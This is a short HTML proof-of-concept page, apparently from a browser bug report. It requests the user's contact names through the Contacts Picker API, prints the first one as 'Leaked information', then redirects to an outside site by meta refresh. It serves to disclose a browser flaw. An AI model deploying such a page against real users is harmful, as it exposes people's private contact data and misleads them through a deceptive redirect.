<!DOCTYPE html>
<html lang="en">
<head>
    <title>PoC</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"/>

    <script>
        async function runPoC() {
            let contacts = await navigator.contacts.select(["name"], {});

            document.body.innerHTML = `
                <h1>
                    <font color="red">Leaked information:</font> ${contacts[0]["name"]}
                </h1>
            `;

            // Meta refresh redirect
            let meta = document.createElement("meta");
            meta.httpEquiv = "refresh";
            meta.content = "2;url=https://www.jody.com";
            document.head.appendChild(meta);
        }
    </script>
</head>
<body>
    <button onclick="runPoC()">Click Me</button>
</body>
</html>
